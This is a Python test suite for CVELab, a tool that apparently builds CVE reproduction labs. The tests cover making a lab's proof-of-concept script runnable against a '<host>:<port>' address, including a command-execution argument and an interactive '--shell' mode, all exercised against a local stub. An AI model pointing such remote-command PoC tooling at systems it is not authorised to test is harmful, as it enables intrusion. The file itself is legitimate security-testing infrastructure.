# Copyright 2026 SyncBit Software SRL and the CVELab contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""The PoC a tester can run: `PoC.py <host>:<port>`, and the port it needs.

WHAT WAS MEASURED, AND WHY ANY OF THIS EXISTS

`artifacts/PoC.py` is `validator/validator.py` with a six-line docstring
prepended and nothing else changed: across 89 archived labs `diff` prints
`0a1,6` and stops. So the artifact the kit calls the manual PoC is the
validator's own source, copied out to be READ -- the guide says
`sed -n '1,260p' PoC.py` and then `bash manual.sh exploit`, which starts that
same code inside the Compose network. On the same 89 labs: none reads
`sys.argv`, every one is driven by CVELAB_MANUAL_ACTION, CVELAB_TARGET and
CVELAB_BOUND, every one addresses its target by Compose service name, and
`policy` refuses `ports` for every lab, so no host address existed to point
anything at. A tester carrying these to a client had a script they could read
and could not run.

WHAT THESE TESTS HOLD

The no-argument path, which is the one the automatic differential takes and
the one 1260 tests rest on, is pinned first and hardest: what CVELab runs,
what `manual.sh` runs, and what the script itself does when handed nothing.
Then the second entry point, the declared port that makes an address
possible, and the refusals for an answer that declares neither.
"""

from __future__ import annotations

import contextlib
import json
import os
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from unittest import mock
from urllib.parse import parse_qs, urlparse

from cvelab import core, deliverables, field, policy, sourcegen, upload

FIXTURE = Path(__file__).resolve().parent / "fixtures" / "operator_validator.py"
PACKAGE = Path(__file__).resolve().parent.parent / "cvelab"
SOURCEGEN = (PACKAGE / "sourcegen.py").read_text(encoding="utf-8")
DELIVERABLES = (PACKAGE / "deliverables.py").read_text(encoding="utf-8")


def contract(**extra: object) -> dict:
    """A declared contract that passes every check, so one field can be removed."""
    held = {
        "attack_summary": "a",
        "preconditions": [],
        "observable_effect": "the supplied command ran",
        "evidence_type": "code_execution",
        "effect_predicate": {"body_contains": "shell-ran"},
        "service_port": 8080,
        "setup": None,
        "setup_port": None,
        "inputs": None,
    }
    held.update(extra)
    return held


class TheDeclaredPortTests(unittest.TestCase):
    """The port the product listens on is asked for, because nothing states it.

    Measured over 89 archived labs, every place the port is recoverable from
    is incidental and none covers the archive: a healthcheck command mentions
    it in 53%, `expose` in 15%, a `PORT = N` constant in the validator in
    15%, and `exploit_contract.setup_port` in 2% -- and that last one exists
    only where the lab declares seeding and means the port the SEEDING goes
    to. Three of the four are string parsing and all four are absent more
    often than present, which is why this is a declaration and not a search.
    """

    def test_both_schemas_require_it_and_bound_it(self) -> None:
        for name, schema in (
            ("differential", sourcegen.SOURCE_SCHEMA),
            ("vulnerable-only", sourcegen.VULNERABLE_ONLY_SCHEMA),
        ):
            with self.subTest(schema=name):
                declared = schema["properties"]["exploit_contract"]
                self.assertIn("service_port", declared["required"])
                port = declared["properties"]["service_port"]
                # Not nullable, unlike setup_port: every lab has one.
                self.assertEqual(port["type"], "integer")
                self.assertEqual((port["minimum"], port["maximum"]), (1, 65535))

    def test_a_declared_port_is_accepted_and_handed_back(self) -> None:
        self.assertEqual(sourcegen._validate_service_port(contract()), 8080)
        self.assertEqual(
            sourcegen._validate_service_port(contract(service_port=1)), 1
        )
        self.assertEqual(
            sourcegen._validate_service_port(contract(service_port=65535)), 65535
        )

    def test_an_answer_without_one_is_refused_before_the_build(self) -> None:
        for declared in (None, 0, 65536, -1, "8080", 8080.0, True, [8080]):
            with self.subTest(service_port=declared):
                with self.assertRaisesRegex(RuntimeError, "service_port"):
                    sourcegen._validate_service_port(contract(service_port=declared))

    def test_a_missing_field_is_refused_as_an_undeclared_port(self) -> None:
        bare = contract()
        del bare["service_port"]
        with self.assertRaisesRegex(RuntimeError, "not optional"):
            sourcegen._validate_service_port(bare)

    def test_the_two_ports_may_not_disagree(self) -> None:
        with self.assertRaisesRegex(RuntimeError, "disagree"):
            sourcegen._validate_service_port(
                contract(service_port=8080, setup_port=3000)
            )
        # Agreeing, and absent, are both fine: setup_port exists only for a
        # lab that declares seeding.
        self.assertEqual(
            sourcegen._validate_service_port(
                contract(service_port=3000, setup_port=3000)
            ),
            3000,
        )
        self.assertEqual(
            sourcegen._validate_service_port(contract(setup_port=None)), 8080
        )

    def test_every_contract_prompt_checks_it(self) -> None:
        """Three prompts ask for the field, so three checks have to read it.

        The same hazard _EFFECT_CONTRACT records: a rule added to one of
        these and not the others is a rule the differential path enforces and
        the repair path waves through. Counting the call sites is what
        notices.
        """
        self.assertEqual(
            SOURCEGEN.count("_validate_service_port(generation[\"exploit_contract\"])"), 3
        )
        self.assertEqual(SOURCEGEN.count("def _validate_service_port("), 1)

    def test_a_plan_is_read_for_it_and_never_guesses(self) -> None:
        self.assertEqual(
            core.service_port({"exploit_contract": contract()}), 8080
        )
        # Every lab generated before the contract asked for it, and every
        # shape a plan can be malformed in. None rather than an inferred
        # number: a wrong guess publishes a port nothing listens on and hands
        # the operator an address that refuses the connection.
        for plan in (
            {},
            {"exploit_contract": None},
            {"exploit_contract": {}},
            {"exploit_contract": {"service_port": None}},
            {"exploit_contract": {"service_port": "8080"}},
            {"exploit_contract": {"service_port": 0}},
            {"exploit_contract": {"service_port": True}},
        ):
            with self.subTest(plan=plan):
                self.assertIsNone(core.service_port(plan))


class TheNoArgumentPathIsUnchangedTests(unittest.TestCase):
    """The regression that would cost the most, pinned from three directions.

    The automatic differential is what proves every lab in the archive, and
    it reaches the validator with no positional argument at all. So the claim
    "nothing changed for it" has to be a measurement of the command CVELab
    builds, the command `manual.sh` builds, and the script's own behaviour
    when handed nothing -- not a reading of the diff.
    """

    def test_cvelab_still_runs_the_validator_with_no_argument(self) -> None:
        """`run_validator` passes a service name and an environment, as before.

        The validator's own image CMD is what starts the script, so there is
        no argument vector for CVELab to add to -- and this asserts the call
        still carries none.
        """
        seen: dict[str, object] = {}

        def record(compose, docker, environment, lab_dir, service, extra, wait):
            seen.update(service=service, extra=extra, compose=list(compose))
            return (0, "{}", "")

        with mock.patch.object(core, "_run_tool_service", record):
            core.run_validator(
                ["docker", "compose"], "docker", {}, Path("."),
                {"CVELAB_MANUAL_ACTION": "verify", "CVELAB_TARGET": "vulnerable"},
                wait_for_services=False,
            )
        self.assertEqual(seen["service"], "validator")
        self.assertEqual(
            seen["extra"],
            {"CVELAB_MANUAL_ACTION": "verify", "CVELAB_TARGET": "vulnerable"},
        )
        # Nothing appended to the Compose command either: the address path is
        # the operator's, run on the host, never CVELab's.
        self.assertEqual(seen["compose"], ["docker", "compose"])

    def test_the_manual_runner_still_drives_the_validator_by_environment(self) -> None:
        runner = written_kit(port=8080)["manual.sh"]
        branch = runner.split("  exploit|verify)", 1)[1].split("\n  *)", 1)[0]
        for line in (
            'export CVELAB_MANUAL_ACTION="$action"',
            'export CVELAB_TARGET="$variant"',
            'export CVELAB_BOUND=""',
            "tool_run validator || exit 1",
            'exit "$TOOL_CODE"',
        ):
            with self.subTest(line=line):
                self.assertIn(line, branch)
        # And the branch hands the validator no address: `tool_run` starts a
        # service, and a service runs its image's own command.
        self.assertNotIn("PoC.py", branch)
        self.assertNotIn("$POC_AT", branch)

    def test_the_script_handed_nothing_does_exactly_what_it_did(self) -> None:
        """Env-driven, service-name-addressed, and it does NOT seed itself.

        The stub stands in for a container CVELab has already put in the
        state the attack needs, which is what `exploit` and `verify` meet.
        The assertion that matters is the last one: the no-argument path must
        not start performing setup, or every automatic run would send two
        extra requests to a lab that was already seeded.
        """
        with stub(seeded=True) as (address, asked):
            said, complained, code = run_fixture(
                [], address,
                {"CVELAB_MANUAL_ACTION": "verify", "CVELAB_TARGET": "127.0.0.1"},
            )
        self.assertEqual(code, 0, complained)
        self.assertEqual(said.strip(), "REPRODUCED")
        self.assertEqual([path for path, _ in asked], ["/run"])

    def test_the_no_argument_path_reports_a_refusal_as_a_refusal(self) -> None:
        """An unseeded instance is BLOCKED, not quietly seeded and confirmed."""
        with stub(seeded=False) as (address, asked):
            said, complained, code = run_fixture(
                [], address,
                {"CVELAB_MANUAL_ACTION": "verify", "CVELAB_TARGET": "127.0.0.1"},
            )
        self.assertEqual(code, 1, complained)
        self.assertEqual(said.strip(), "BLOCKED")
        self.assertEqual([path for path, _ in asked], ["/run"])

    def test_exploit_still_prints_the_response_as_received(self) -> None:
        with stub(seeded=True) as (address, _):
            said, complained, code = run_fixture(
                [], address,
                {"CVELAB_MANUAL_ACTION": "exploit", "CVELAB_TARGET": "127.0.0.1"},
            )
        self.assertEqual(code, 0, complained)
        self.assertIn("shell-ran", said)
        self.assertNotIn("REPRODUCED", said)


class TheAddressPathTests(unittest.TestCase):
    """One positional argument, the way an exploit-db script takes one."""

    def test_an_address_is_sent_to_and_the_script_seeds_itself(self) -> None:
        """The two things the service-name path got for free.

        `CVELAB_BOUND` does not exist when a person runs this by hand, so the
        script performs the lab's declared setup itself; and because it is
        one process rather than a fresh container per step, the session that
        setup established is still in force when the attack goes out. The
        stub refuses `/run` to a caller that has not logged in IN THE SAME
        SESSION, so both only hold together.
        """
        with stub(seeded=False) as (address, asked):
            said, complained, code = run_fixture([address], address, {})
        self.assertEqual(code, 0, complained)
        self.assertIn("REPRODUCED", said)
        self.assertEqual([path for path, _ in asked], ["/login", "/run"])
        # The address it was about to use, named on stderr before the first
        # request, so the run is visible in whatever captured it.
        self.assertIn(address, complained)

    def test_a_bare_host_falls_back_to_the_declared_port(self) -> None:
        with stub(seeded=False) as (address, asked):
            host, port = address.rsplit(":", 1)
            said, complained, code = run_fixture(
                [host], address, {}, port=port
            )
        self.assertEqual(code, 0, complained)
        self.assertIn("REPRODUCED", said)
        self.assertEqual([path for path, _ in asked], ["/login", "/run"])

    def test_a_command_is_run_and_its_output_printed(self) -> None:
        """The RCE case: what makes a demonstration a demonstration."""
        with stub(seeded=False) as (address, asked):
            said, complained, code = run_fixture([address, "id"], address, {})
        self.assertEqual(code, 0, complained)
        self.assertIn("command output:", said)
        self.assertIn("uid=0(root)", said)
        self.assertEqual(
            [query.get("cmd") for path, query in asked if path == "/run"],
            [["id"]],
        )

    def test_no_command_runs_the_labs_own_canary(self) -> None:
        with stub(seeded=False) as (address, asked):
            run_fixture([address], address, {})
        sent = [query.get("cmd") for path, query in asked if path == "/run"]
        self.assertEqual(sent, [["echo CVELAB-fixture-canary"]])

    def test_a_third_argument_is_refused_rather_than_ignored(self) -> None:
        with stub(seeded=False) as (address, asked):
            said, complained, code = run_fixture(
                [address, "id", "extra"], address, {}
            )
        # Not 0. Refusing to run is not a run, and a usage line over a zero
        # status tells whatever read the status that the proof succeeded --
        # measured on a generated lab, whose `PoC.py <address> id` on a lab
        # that declares no command execution printed its usage and exited 0.
        self.assertEqual(code, 2)
        self.assertIn("usage", complained)
        self.assertEqual(asked, [])

    def test_the_usage_line_names_the_file_it_was_run_as(self) -> None:
        """The same script, under both of the names it is delivered with.

        It is `validator/validator.py` inside the lab and `artifacts/PoC.py`
        in the operator's hands -- byte for byte apart from a docstring -- so
        a name written into the text is wrong in one of the two places. A
        generated lab printed `usage: validator.py [<host>:<port>]` to a
        reader whose guide tells them to run `PoC.py`.
        """
        with tempfile.TemporaryDirectory() as temporary:
            for name in ("PoC.py", "validator.py"):
                copy = Path(temporary) / name
                copy.write_text(FIXTURE.read_text(encoding="utf-8"), encoding="utf-8")
                finished = subprocess.run(
                    [sys.executable, "-I", str(copy), "a", "b", "c"],
                    capture_output=True, text=True, timeout=60,
                )
                with self.subTest(name=name):
                    self.assertEqual(finished.returncode, 2)
                    self.assertIn(f"usage: {name} ", finished.stderr)

    def test_a_usage_line_with_a_filename_in_it_is_refused(self) -> None:
        from tests.test_sourcegen_contract import generated_files

        named = fixture_source().replace(
            '"usage: %s [<host>:<port>] [command]" % os.path.basename(argv[0])',
            '"usage: validator.py [<host>:<port>] [command]"',
        )
        self.assertIn("usage: validator.py", named)
        with self.assertRaisesRegex(RuntimeError, "usage line"):
            sourcegen._validate_generated(generated_files(named))

    def test_the_contract_checks_accept_a_script_written_to_it(self) -> None:
        """The fixture is held to the same gate a generated validator is.

        Which is the point of writing it: a contract whose own checks refuse
        a correct implementation is a contract nothing can satisfy.
        """
        from tests.test_sourcegen_contract import generated_files

        sourcegen._validate_generated(generated_files(fixture_source()))

    def test_a_script_that_reads_no_argument_is_refused(self) -> None:
        from tests.test_sourcegen_contract import generated_files

        without = fixture_source().replace("sys.argv", "ARGV")
        with self.assertRaisesRegex(RuntimeError, "no positional argument"):
            sourcegen._validate_generated(generated_files(without))


class ThePromptDrivesTheSecondEntryPointTests(unittest.TestCase):
    """`--shell`, measured against the script the contract is satisfiable by.

    The fixture beside these tests is the smallest validator
    `_OPERATOR_CONTRACT` admits, and it implements the one-command form the
    contract asks for in prose. So the prompt can be measured here the way
    nothing else in the suite can: a real two-entry-point validator, a real
    product on a real socket, and a line typed at a prompt arriving as a
    request.

    What is held: that a typed line reaches the lab program's own address
    path and nowhere else, that each line is one invocation and therefore one
    session -- the session the contract makes that path build for itself --
    and that none of this is reachable with no argument at all, which is the
    path the automatic differential takes.
    """

    def plan(self, **extra: object) -> dict:
        held = {
            "cve": "CVE-2026-0001",
            "lab_type": "SOURCE_REPRODUCTION",
            "repository": "https://example.invalid/p.git",
            "exploit_contract": contract(),
            "fidelity": {"simulated_components": ["an adapter over the helper"]},
        }
        held.update(extra)
        return held

    def artifact(self, **extra: object) -> str:
        return field.emit_poc(
            "CVE-2026-0001", self.plan(**extra),
            FIXTURE.read_text(encoding="utf-8"),
            {"shipped": False, "reason": "nothing was proved against one instance"},
        )

    def ran(
        self, text: str, *argv: str, typed: str = "", port: str = ""
    ) -> tuple[str, str, int]:
        environment = dict(os.environ)
        for name in ("CVELAB_MANUAL_ACTION", "CVELAB_TARGET", "CVELAB_BOUND"):
            environment.pop(name, None)
        if port:
            environment["CVELAB_FIXTURE_PORT"] = port
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / field.POC_NAME
            path.write_text(text, encoding="utf-8")
            finished = subprocess.run(
                [sys.executable, str(path), *argv], input=typed,
                capture_output=True, text=True, timeout=120, env=environment,
            )
        return finished.stdout, finished.stderr, finished.returncode

    def test_the_prompt_is_offered_for_a_validator_that_implements_the_form(self) -> None:
        offered, reason = field.shell_standing(
            self.plan(), FIXTURE.read_text(encoding="utf-8")
        )
        self.assertTrue(offered, reason)
        self.assertIn("--shell", self.artifact())

    def test_a_typed_line_arrives_at_the_product_as_one_command(self) -> None:
        with stub(seeded=False) as (address, asked):
            said, complained, code = self.ran(
                self.artifact(), "--lab-address", address, "--shell", "--allow-shell",
                typed="id\n", port=address.rsplit(":", 1)[1],
            )
        self.assertEqual(code, 0, complained)
        # The address path's own session, built for that line and used by it:
        # the stub refuses /run to a caller that has not logged in.
        self.assertEqual([path for path, _ in asked], ["/login", "/run"])
        self.assertEqual(
            [query.get("cmd") for path, query in asked if path == "/run"], [["id"]]
        )
        self.assertIn("uid=0(root)", said)
        # This validator prints its status line first, which does not read
        # like the drafter's output header -- so nothing is stripped and
        # everything it printed is here.
        self.assertIn("status: 200", said)
        self.assertIn("REPRODUCED", said)

    def test_each_line_is_its_own_invocation_and_its_own_session(self) -> None:
        with stub(seeded=False) as (address, asked):
            said, complained, code = self.ran(
                self.artifact(), "--lab-address", address, "--shell", "--allow-shell",
                typed="id\necho two\nexit\n", port=address.rsplit(":", 1)[1],
            )
        self.assertEqual(code, 0, complained)
        self.assertEqual(
            [path for path, _ in asked], ["/login", "/run", "/login", "/run"]
        )
        self.assertEqual(
            [query.get("cmd") for path, query in asked if path == "/run"],
            [["id"], ["echo two"]],
        )
        self.assertEqual(said.count("REPRODUCED"), 2)

    def test_the_directory_it_tracks_rides_on_the_command_itself(self) -> None:
        with stub(seeded=False) as (address, asked):
            self.ran(
                self.artifact(), "--lab-address", address, "--shell", "--allow-shell",
                typed="cd /srv\nls\n", port=address.rsplit(":", 1)[1],
            )
        self.assertEqual(
            [query.get("cmd") for path, query in asked if path == "/run"],
            [["cd /srv && ls"]],
        )

    def test_the_no_argument_path_is_unchanged_with_the_prompt_in_the_file(self) -> None:
        """The path every proof rests on, measured with the mode present."""
        text = self.artifact()
        self.assertIn("_shell_given(sys.argv)", text)
        with tempfile.TemporaryDirectory() as temporary:
            alone = Path(temporary) / "validator.py"
            alone.write_text(FIXTURE.read_text(encoding="utf-8"), encoding="utf-8")
            merged = Path(temporary) / field.POC_NAME
            merged.write_text(text, encoding="utf-8")
            environment = dict(os.environ)
            for name in ("CVELAB_MANUAL_ACTION", "CVELAB_TARGET", "CVELAB_BOUND"):
                environment.pop(name, None)
            runs = [
                subprocess.run(
                    [sys.executable, str(script)], capture_output=True, text=True,
                    timeout=60, env=environment,
                )
                for script in (merged, alone)
            ]
        self.assertEqual(runs[0].stdout, runs[1].stdout)
        self.assertEqual(runs[0].returncode, runs[1].returncode)

    def test_a_lab_that_declares_no_port_is_offered_no_prompt(self) -> None:
        text = self.artifact(exploit_contract=None)
        self.assertNotIn("--shell", text)
        self.assertNotIn("--allow-shell", text)
        _, complained, code = self.ran(text, "--shell", "--allow-shell")
        self.assertEqual(code, 2)
        self.assertIn("no remote mode", complained)


class TheGenerationContractSaysSoTests(unittest.TestCase):
    """What the three prompts are required to carry, in the words they use."""

    def test_the_operator_contract_reaches_every_prompt(self) -> None:
        self.assertEqual(SOURCEGEN.count("+ _OPERATOR_CONTRACT"), 3)
        self.assertEqual(SOURCEGEN.count("_OPERATOR_CONTRACT = ("), 1)

    def test_it_is_appended_after_the_pinned_sentence(self) -> None:
        """Where it has to go, and the test that says why.

        tests/test_sourcegen_contract splits this file on "the literal keys
        attack_executed", requires exactly two blocks, and requires
        "Measure confirmed the same way on both sides" inside the first 2000
        characters of each. Text added AHEAD of that sentence in the
        differential block pushes it out of the window; text appended after
        it moves no offset. This asserts the appended position directly, so a
        later edit that inserts instead of appending fails here with the
        reason rather than there with an offset.
        """
        for block in SOURCEGEN.split("+ _OPERATOR_CONTRACT")[:-1]:
            self.assertTrue(
                block.rstrip().endswith("+ _SETUP_CONTRACT"),
                block.rstrip()[-120:],
            )

    def test_it_states_each_thing_the_measurement_found_missing(self) -> None:
        said = sourcegen._OPERATOR_CONTRACT
        for claim in (
            # The declared port, because nothing else states it.
            "exploit_contract.service_port",
            # The no-argument path, named as the one that must not move.
            "with no positional argument",
            "behaves exactly as described above",
            # The address, in the shape the owner asked for.
            "<host>:<port>",
            "sys.argv[1] is the address",
            # A session, because each manual step is a fresh container.
            "hold one session for the whole run",
            "HTTPCookieProcessor",
            # Its own setup, because CVELAB_BOUND is not there by hand.
            "exploit_contract.setup's own steps",
            "CVELAB_BOUND does not exist on this path",
            # Stdlib only: the operator must not have to install anything.
            "never import requests",
            # The RCE case, and only for the shape it means something on.
            "evidence_type is code_execution",
            "optional SECOND positional argument",
            "For every other evidence_type there is no second argument",
            # An argument the script will not act on, and the status that
            # says so. One generated lab printed its usage and exited 0.
            "Never exit 0 there",
            "os.path.basename(sys.argv[0])",
            # And the lab itself is not loosened by any of it.
            "internal: true",
        ):
            with self.subTest(claim=claim):
                self.assertIn(claim, said)

    def test_the_package_names_no_cve(self) -> None:
        """The prompts are prose, and prose is where a CVE id slips in.

        tests/test_no_per_cve_logic scans every line of every package file
        for this already; it is repeated on the one string this change added
        because that is the string a later edit will be made to.
        """
        self.assertIsNone(core.CVE_PATTERN.search(sourcegen._OPERATOR_CONTRACT))


def fixture_source() -> str:
    """The fixture script as a generated validator would arrive, licence off.

    Every file in this repository carries the Apache header, and the header
    carries the licence URL -- which `_validate_generated` reads, correctly,
    as a host that is not one of the lab's services. A model's `validator_py`
    is a bare script with no header at all, so the header is what is removed
    here rather than the check that would refuse it.
    """
    text = FIXTURE.read_text(encoding="utf-8")
    return text.split("# limitations under the License.\n", 1)[1]


#: A record of a proved remote mode, as report.manual_poc_field carries one.
#: The kit says different things about the published address depending on
#: whether there is anything to point at it, so the shape is a fixture here.
PROVED = {
    "shipped": True,
    "container_port": 8080,
    "spec": {
        "strategy": "direct_observation",
        "transport": "http",
        "observable_effect": "a protected canary returned to an unauthenticated requester",
        "inputs": ["target_path"],
        "checks": [{
            "label": "spec",
            "discover": [],
            "probe": [{"method": "GET", "path": "{{target_path}}"}],
            "expect": {"status": 200},
        }],
        "auth": {},
        "health_timeout": 120,
    },
    "lab_values": {"target_path": "/canary"},
}


def written_kit(
    port: int | None,
    seeds: bool = False,
    record: dict | None = None,
) -> dict:
    """The handed-over kit for one lab shape, as files, written to a temp dir."""
    with tempfile.TemporaryDirectory() as temporary:
        lab = Path(temporary)
        artifacts = lab / "artifacts"
        artifacts.mkdir()
        deliverables._write_generic_manual_assets(
            "CVE-2026-0001", lab, artifacts, False, seeds, port, record
        )
        return {
            item.name: item.read_text(encoding="utf-8")
            for item in artifacts.iterdir()
            if item.is_file()
        }


class TheRunnerPublishesOnePortTests(unittest.TestCase):
    """What `manual.sh` does with the declared port, line by line.

    The address is read back from Docker rather than written down because the
    override publishes `127.0.0.1::<container port>` -- an empty host side,
    so the kernel assigns it and nothing collides with a port the owner is
    already using. That means there is no number to print until the container
    is up.
    """

    def test_it_merges_the_override_and_reads_the_address_back(self) -> None:
        runner = written_kit(port=8080, record=PROVED)["manual.sh"]
        self.assertIn(
            f'PORTS="$LAB_ROOT/artifacts/{core.SHIPPED_MANUAL_PORTS_FILE}"', runner
        )
        self.assertIn('SERVICE_PORT="8080"', runner)
        self.assertIn('if [[ -n "$SERVICE_PORT" && -f "$PORTS" ]]; then\n  COMPOSE+=(-f "$PORTS")', runner)
        self.assertIn(
            'published="$("${COMPOSE[@]}" port "$variant" "$SERVICE_PORT" 2>/dev/null | tail -n 1)"',
            runner,
        )
        self.assertIn('echo "This build is reachable on $POC_AT"', runner)
        self.assertIn(
            'echo "  python3 \\"$LAB_ROOT/artifacts/PoC.py\\" $POC_AT'
            ' --input target_path=/canary"',
            runner,
        )
        self.assertIn("setup|exploit|verify|address|cleanup", runner)

    def test_a_lab_with_no_proved_remote_mode_is_offered_no_command(self) -> None:
        """A printed command that exits 2 reads as a broken kit.

        Remote mode refuses for three labs in four, and the refusal is the
        drafter's own recorded judgement rather than a fault. The hint says so
        and sends the reader to the document that carries the reason.
        """
        runner = written_kit(port=8080)["manual.sh"]
        self.assertIn('echo "This build is reachable on $POC_AT"', runner)
        self.assertIn("nothing here may be pointed at that address", runner)
        self.assertNotIn(r'python3 \"$LAB_ROOT', runner)

    def test_a_lab_that_declared_no_port_publishes_nothing(self) -> None:
        """An archived lab gets the runner it always had.

        Its validator reads no argument either, so a runner that published a
        port and printed an address would describe a script the lab does not
        contain.
        """
        runner = written_kit(port=None)["manual.sh"]
        self.assertIn('SERVICE_PORT=""', runner)
        self.assertNotIn("__SERVICE_PORT__", runner)
        self.assertNotIn("__POC_HINT__", runner)

    def test_no_substitution_is_left_unfilled(self) -> None:
        for port in (8080, None):
            with self.subTest(port=port):
                kit = written_kit(port=port, seeds=True, record=PROVED)
                for name, text in kit.items():
                    with self.subTest(file=name):
                        self.assertNotIn("__", text.replace("__pycache__", ""))

    def test_the_runner_and_the_wrapper_are_valid(self) -> None:
        """`bash -n` on the shell and the new action in the PowerShell set."""
        for port in (8080, None):
            kit = written_kit(port=port, seeds=True, record=PROVED)
            with tempfile.TemporaryDirectory() as temporary:
                script = Path(temporary) / "manual.sh"
                script.write_text(kit["manual.sh"], encoding="utf-8")
                checked = subprocess.run(
                    ["bash", "-n", str(script)], capture_output=True, text=True
                )
                with self.subTest(port=port):
                    self.assertEqual(checked.returncode, 0, checked.stderr)
            self.assertIn(
                '[ValidateSet("setup", "exploit", "verify", "address", "cleanup")]',
                kit["PoC.ps1"],
            )

    def test_the_address_action_asks_docker_and_reports_a_lab_without_one(self) -> None:
        """Run for real, against a `docker` that is a shell script.

        No container is built or started: the stub answers `compose port`
        with an address and everything else with nothing, which is all this
        branch reads.
        """
        for port, published, expected in (
            (8080, "127.0.0.1:49159", "127.0.0.1:49159"),
            (None, "", None),
        ):
            with self.subTest(port=port):
                self.assertEqual(ran_address(port, published), expected)


class ThePublishedOverrideTests(unittest.TestCase):
    """The Compose file `prepare_compose` writes, and the one it does not merge.

    `policy.manual_port_override` draws the line: `ports` stays refused in a
    lab's own definition because the automatic path builds and runs
    model-written code unattended, and a published port there would listen at
    a time nobody chose. Manual mode inverts that -- one lab, by name, with a
    person at the keyboard. So this file is written and left alone, and only
    `manual.sh` appends it.
    """

    def _prepared(self, port: int | None, services: tuple[str, ...]) -> tuple[dict, list[str]]:
        # Resolved shape, including each service's own network membership:
        # the override has to carry that through, and the name is `labnet`
        # here on purpose -- a lab's network is not necessarily called `lab`.
        model = {
            "services": {
                name: {"build": {"context": "."}, "networks": {"labnet": None}}
                for name in (*services, "validator")
            },
            "networks": {"labnet": {"internal": True}},
        }
        with tempfile.TemporaryDirectory() as temporary:
            lab = Path(temporary)
            (lab / "artifacts").mkdir()
            (lab / "docker-compose.yml").write_text("services: {}\n", encoding="utf-8")
            with mock.patch.object(core, "docker_executable", return_value="docker"), \
                    mock.patch.object(core, "docker_environment", return_value={}), \
                    mock.patch.object(core, "ensure_docker"), \
                    mock.patch.object(
                        core, "compose_command", return_value=["docker", "compose"],
                    ), \
                    mock.patch.object(policy, "enforce", return_value=model):
                _, _, compose, scratch = core.prepare_compose(lab, None, port)
            try:
                shipped = lab / "artifacts" / core.SHIPPED_MANUAL_PORTS_FILE
                written = (
                    json.loads(shipped.read_text(encoding="utf-8"))
                    if shipped.is_file()
                    else {}
                )
            finally:
                for leftover in scratch.iterdir():
                    leftover.unlink()
                scratch.rmdir()
            return written, list(compose)

    def test_both_builds_are_published_on_loopback_with_no_host_number(self) -> None:
        written, _ = self._prepared(8080, ("vulnerable", "patched"))
        self.assertEqual(sorted(written["services"]), ["patched", "vulnerable"])
        for name, definition in written["services"].items():
            with self.subTest(service=name):
                self.assertEqual(definition, {
                    # Beside the lab's own, not instead of it, and under the
                    # name the model gave rather than a guess at it.
                    "networks": {"labnet": None, policy.MANUAL_NETWORK: None},
                    "ports": ["127.0.0.1::8080"],
                })
                # Never 0.0.0.0, which is what a short form with no address
                # binds: that would put an exploitable build on whatever
                # network the owner's laptop is on at a client site.
                self.assertTrue(definition["ports"][0].startswith(policy.MANUAL_BIND))

    def test_the_file_brings_the_network_that_makes_the_port_real(self) -> None:
        """One network for the file, and the only thing in it not internal.

        Without it the two `ports` entries above resolve correctly and
        publish nothing: Docker drops a publication for a service whose
        networks are all internal, which is how `manual.sh` came to print
        `:0` as the address of a container with no host port.
        """
        written, _ = self._prepared(8080, ("vulnerable", "patched"))
        self.assertEqual(written["networks"], {policy.MANUAL_NETWORK: {
            "internal": False,
            "driver_opts": dict(policy.MANUAL_NETWORK_DRIVER_OPTS),
        }})
        # The lab's own network is not in the file at all, so merging it
        # cannot turn `internal: true` off for anything of the lab's.
        self.assertNotIn("labnet", written["networks"])

    def test_a_vulnerable_only_lab_publishes_the_one_build_it_has(self) -> None:
        written, _ = self._prepared(8080, ("vulnerable",))
        self.assertEqual(sorted(written["services"]), ["vulnerable"])

    def test_cvelabs_own_run_never_appends_it(self) -> None:
        """Written for `manual.sh`, and not merged into the automatic path."""
        _, compose = self._prepared(8080, ("vulnerable", "patched"))
        self.assertEqual(len(compose), 4)
        self.assertEqual(compose[:3], ["docker", "compose", "-f"])
        self.assertNotIn(core.SHIPPED_MANUAL_PORTS_FILE, compose[-1])
        self.assertIn("runtime-limits.json", compose[-1])

    def test_a_lab_with_no_declared_port_writes_no_such_file(self) -> None:
        written, compose = self._prepared(None, ("vulnerable", "patched"))
        self.assertEqual(written, {})
        self.assertEqual(len(compose), 4)

    def test_the_override_is_only_ever_built_by_cvelab_for_a_named_service(self) -> None:
        """The refusal this exception does not open.

        `enforce` never sees this file, so a lab writing `ports:` into its own
        Compose is refused exactly as before -- pinned in
        tests/test_compose_policy. What is pinned here is the other half: the
        override is not a key a lab can ask for. It is built by CVELab for a
        service the CALLER names, and names that are not a build of the lab's
        are refused outright.
        """
        model = {
            "services": {"vulnerable": {"build": {"context": "."}}},
            "networks": {"labnet": {"internal": True}},
        }
        for service, port, because in (
            (policy.SETUP_SERVICE, 8080, "CVELab's own"),
            ("absent", 8080, "no service"),
            ("vulnerable", 0, "not a port"),
            ("vulnerable", "8080", "not a port"),
            ("vulnerable", True, "not a port"),
        ):
            with self.subTest(service=service, port=port):
                with self.assertRaisesRegex(policy.PolicyError, because):
                    policy.manual_port_override(model, service, port)

    def test_the_shipped_file_travels_with_a_shared_lab(self) -> None:
        self.assertIn(core.SHIPPED_MANUAL_PORTS_FILE, upload.ALWAYS)
        self.assertIn(core.SHIPPED_MANUAL_PORTS_FILE, upload.EXPLOIT)


class TheGuideSaysWhatIsTrueTests(unittest.TestCase):
    """The document ended with a sentence the change makes false.

    "Targets are Docker service names only; this PoC has no arbitrary or
    remote target option." It was true when `PoC.py` could not be run at all.
    """

    def test_the_old_closing_claim_is_gone_from_the_package(self) -> None:
        self.assertNotIn("no arbitrary or remote target option", DELIVERABLES)

    def test_the_reach_section_names_the_argument_and_the_authorization(self) -> None:
        guide = written_kit(port=8080, record=PROVED)["LAB-POC.md"]
        head = " ".join(guide.split("## How the steps work")[0].split())
        # Still true, and still first: the runner takes a service name.
        self.assertIn("not an address", head)
        self.assertIn("be pointed at a client's server", head)
        # And now the part that is new, in the same breath.
        self.assertIn("runs against those same builds when it is given no argument", head)
        self.assertIn("`PoC.py`'s remote mode", head)
